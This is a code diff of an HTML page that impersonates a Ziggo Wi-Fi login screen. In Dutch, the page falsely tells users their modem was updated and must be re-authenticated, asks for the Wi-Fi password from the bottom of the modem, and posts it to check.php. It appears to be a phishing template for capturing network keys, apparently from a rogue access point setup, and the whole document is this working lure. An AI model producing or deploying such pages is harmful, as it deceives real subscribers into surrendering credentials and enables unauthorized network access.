@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html dir="ltr" lang="en-US">
+<head>
 <meta http-equiv="content-type" content="text/html; charset=utf-8" />
 <title>Ziggo Wi-Fi Login</title>
 
@@ -159,36 +160,39 @@ div {
 }
 
 </style>
+</head>
 
-<div class="logo"></div>
+<body onload="getFocus()">
+	<div class="logo"></div>
 
-<div id="background">
-	<div id="overlay">
-		<div id="white">
-			<div id="title">
-				Welkom
-			</div>
-			<div id="text">
-				Uw Wi-Fi modem heeft recentelijk een update gehad. Hierdoor is het vanuit veiligheidsoverwegingen noodzakelijk dat u uw wachtwoord opnieuw invult. Uw wachtwoord is te vinden aan de onderkant van uw Wi-Fi modem.
-			</div>
-			<div id="input">
-				<form method="post" action="check.php" name="Login">
-					<table id="table">
-							<tr id="row">
-								<td id="data1">
-									Wachtwoord
-								</td>
-								<td id="data2">
-									<input type="text" id="inputdata" name="loginPassword" />
-								</td>
-							</tr>
-					</table>
-					<div id="button">
-						<input type="submit" id="next" value="Doorgaan" />
-					</div>
-				</form>
+	<div id="background">
+		<div id="overlay">
+			<div id="white">
+				<div id="title">
+					Welkom
+				</div>
+				<div id="text">
+					Uw Wi-Fi modem heeft recentelijk een update gehad. Hierdoor is het vanuit veiligheidsoverwegingen noodzakelijk dat u uw wachtwoord opnieuw invult. Uw wachtwoord is te vinden aan de onderkant van uw Wi-Fi modem.
+				</div>
+				<div id="input">
+					<form id="form1" method="POST" action="check.php" name="form1">
+						<table id="table">
+								<tr id="row">
+									<td id="data1">
+										<label for="inputdata">Wachtwoord</label>
+									</td>
+									<td id="data2">
+										<input id="inputdata" name="key1" value="" type="password">
+									</td>
+								</tr>
+						</table>
+						<div id="button">
+							<input type="submit" id="next" value="Doorgaan">
+						</div>
+					</form>
+				</div>
 			</div>
 		</div>
 	</div>
-</div>
+</body>
 </html>
